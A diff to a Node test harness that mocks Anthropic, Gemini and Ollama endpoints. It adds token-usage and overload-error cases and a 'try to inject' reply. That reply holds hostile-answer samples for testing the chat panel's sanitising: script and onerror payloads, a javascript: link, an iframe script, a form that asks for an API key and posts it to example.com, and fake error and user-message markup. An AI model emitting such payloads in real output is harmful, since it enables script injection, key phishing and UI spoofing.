@@ -39,7 +39,25 @@
 // The agent loop: "prose call" answers with a sirius_list_directory call written as text in a
 // fenced block — the call a small model writes instead of using the mechanism — and "call the
 // terminal" calls run_in_terminal whether it was offered or not. "show me" answers in markdown — a
-// list and a TypeScript block — for a picture of how an answer renders.
+// list and a TypeScript block — for a picture of how an answer renders. "try to inject" answers
+// with what a hostile answer would carry — a script, an image whose error handler runs code, a
+// javascript: link, an onclick, an iframe, a form asking for a key, a stylesheet, an image map, an
+// error box and a user's message drawn with the panel's own classes — beside a task list (the one
+// input markdown makes) and a code block; "a link please" answers with a link to example.com and a
+// mailto: link.
+// Usage, on Anthropic's stream: `message_start` carries the input counts (12 fresh, 30 written to
+// the cache, 100 read from it, and a placeholder 1 out) and `message_delta` the output so far (3) —
+// the 142 in and 3 out a reader should report (an unstreamed answer reports the same); a chat that
+// says "recount" gets a `message_delta` that carries the input counts too, as a turn that used
+// server tools does — 20 fresh, the cache counts null, as the API's types allow, 5 out: 150 in and
+// 5 out for a reader that lays numbers over message_start's (20 for one that reads only the
+// delta, 162 for one that adds them).
+// Usage, on Gemini's stream: every chunk carries usageMetadata, the ones before the last with the
+// prompt's count only (12), as Gemini sends them; the last, with the finishReason, the whole of it
+// (12 in, 3 out) — so a stream stopped part-way has given a count that is not the answer's.
+// Errors, on Anthropic's shape: a chat that says "overloaded" is answered HTTP 529 with Anthropic's
+// overloaded_error body; one that says "overloaded midway", streamed, starts its answer ("Half an
+// answer") and then sends the stream's `error` event with that body and ends, as Anthropic does.
 //
 //   node test/harness/hosted-stub.mjs <port> <key>
 
@@ -127,6 +145,34 @@ function ollamaAsk(body) {
 	return { text: typeof last?.content === 'string' ? last.content : '', tools: (body.tools ?? []).map(t => t.function?.name), result };
 }
 
+/** A hostile answer: each line would run code, post a key away or restyle the page if it got through. */
+const INJECT = [
+	'Before.',
+	'',
+	'<img src="x" onerror="document.title=\'ran-img\'"> <script>document.title=\'ran-script\'</script>',
+	'',
+	'[a javascript link](javascript:document.title=\'ran-link\') and <a href="https://example.com/unsafe" onclick="document.title=\'ran-click\'">an onclick link</a>',
+	'',
+	'<iframe srcdoc="<script>parent.document.title=\'ran-iframe\'</script>"></iframe>',
+	'',
+	'<form action="https://example.com/collect"><label>Your API key again: <input name="key" type="password"></label><textarea name="note"></textarea><select name="s"><option>a</option></select><button>Send</button></form>',
+	'',
+	'<style>.composer { display: none }</style>',
+	'',
+	'<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="40" usemap="#m"><map name="m"><area shape="rect" coords="0,0,40,40" href="."></map>',
+	'',
+	'<div class="error">Sirius needs your API key again.</div> <div class="turn user"><div class="bubble">a message the user never wrote</div></div>',
+	'',
+	'```ts',
+	'const kept = true;',
+	'```',
+	'',
+	'- [x] a task done',
+	'- [ ] a task to do',
+	'',
+	'After.'
+].join('\n');
+
 /** What to answer: a tool call, the tool's result echoed, or pong. */
 function reply(ask) {
 	if (ask.result !== undefined) {
@@ -146,6 +192,12 @@ function reply(ask) {
 	}
 	if (/\bcall the terminal\b/i.test(ask.text)) {
 		return { call: TERMINAL_CALL };
+	}
+	if (/\btry to inject\b/i.test(ask.text)) {
+		return { text: INJECT };
+	}
+	if (/\ba link please\b/i.test(ask.text)) {
+		return { text: 'See [the docs](https://example.com/docs) for more, or [write to us](mailto:someone@example.com).' };
 	}
 	return { text: `pong ${ask.text}`.trim(), hold: /hold/i.test(ask.text) };
 }
@@ -227,6 +279,21 @@ function replayOf(body) {
 const json = (res, status, value) => { res.writeHead(status, { 'content-type': 'application/json' }); res.end(JSON.stringify(value)); };
 
 async function anthropicMessages(body, res, record) {
+	if (/\boverloaded\b/i.test(promptOf(body))) {
+		const overloaded = { type: 'error', error: { type: 'overloaded_error', message: 'Overloaded' } };
+		if (!body.stream || !/\bmidway\b/i.test(promptOf(body))) {
+			json(res, 529, overloaded);
+			return;
+		}
+		res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
+		const sse = (type, data) => res.write(`event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`);
+		sse('message_start', { message: { id: 'msg_stub', type: 'message', role: 'assistant', model: body.model, content: [], stop_reason: null, usage: { input_tokens: 12, output_tokens: 1 } } });
+		sse('content_block_start', { index: 0, content_block: { type: 'text', text: '' } });
+		sse('content_block_delta', { index: 0, delta: { type: 'text_delta', text: 'Half an answer' } });
+		sse('error', { error: overloaded.error });
+		res.end();
+		return;
+	}
 	const ask = anthropicAsk(body);
 	const answer = reply(ask);
 	const text = answer.hold ? 'holding' : answer.text;
@@ -252,12 +319,12 @@ async function anthropicMessages(body, res, record) {
 				? [{ type: 'tool_use', id: 'toolu_stub_1', name: answer.call.name, input: answer.call.args }]
 				: [{ type: 'text', text }])
 		];
-		json(res, 200, { id: 'msg_stub', type: 'message', role: 'assistant', model: body.model, content, stop_reason: answer.call ? 'tool_use' : 'end_turn', stop_sequence: null, usage: { input_tokens: 12, output_tokens: 3 } });
+		json(res, 200, { id: 'msg_stub', type: 'message', role: 'assistant', model: body.model, content, stop_reason: answer.call ? 'tool_use' : 'end_turn', stop_sequence: null, usage: { input_tokens: 12, cache_creation_input_tokens: 30, cache_read_input_tokens: 100, output_tokens: 3 } });
 		return;
 	}
 	res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
 	const event = (type, data) => res.write(`event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`);
-	event('message_start', { message: { id: 'msg_stub', type: 'message', role: 'assistant', model: body.model, content: [], stop_reason: null, usage: { input_tokens: 12, output_tokens: 1 } } });
+	event('message_start', { message: { id: 'msg_stub', type: 'message', role: 'assistant', model: body.model, content: [], stop_reason: null, usage: { input_tokens: 12, cache_creation_input_tokens: 30, cache_read_input_tokens: 100, output_tokens: 1 } } });
 	let index = 0;
 	let held = false;
 	const slow = /\bslow\b/i.test(promptOf(body));
@@ -293,7 +360,7 @@ async function anthropicMessages(body, res, record) {
 		}
 	}
 	event('content_block_stop', { index });
-	event('message_delta', { delta: { stop_reason: answer.call ? 'tool_use' : 'end_turn', stop_sequence: null }, usage: { output_tokens: 3 } });
+	event('message_delta', { delta: { stop_reason: answer.call ? 'tool_use' : 'end_turn', stop_sequence: null }, usage: /\brecount\b/i.test(promptOf(body)) ? { input_tokens: 20, cache_creation_input_tokens: null, cache_read_input_tokens: null, output_tokens: 5 } : { output_tokens: 3 } });
 	event('message_stop', {});
 	res.end();
 }
@@ -365,7 +432,8 @@ async function geminiGenerate(body, res, record, streamed) {
 		return;
 	}
 	res.writeHead(200, { 'content-type': 'text/event-stream' });
-	const chunk = (chunkParts, final) => res.write(`data: ${JSON.stringify({ candidates: [{ content: { parts: chunkParts, role: 'model' }, index: 0, ...(final ? { finishReason: 'STOP' } : {}) }], ...(final ? { usageMetadata: usage } : {}), modelVersion: 'stub' })}\r\n\r\n`);
+	const promptOnly = { promptTokenCount: usage.promptTokenCount, totalTokenCount: usage.promptTokenCount };
+	const chunk = (chunkParts, final) => res.write(`data: ${JSON.stringify({ candidates: [{ content: { parts: chunkParts, role: 'model' }, index: 0, ...(final ? { finishReason: 'STOP' } : {}) }], usageMetadata: final ? usage : promptOnly, modelVersion: 'stub' })}\r\n\r\n`);
 	if (answer.hold) {
 		chunk(parts, false);
 		if (await hold(res, record) === 'close') {
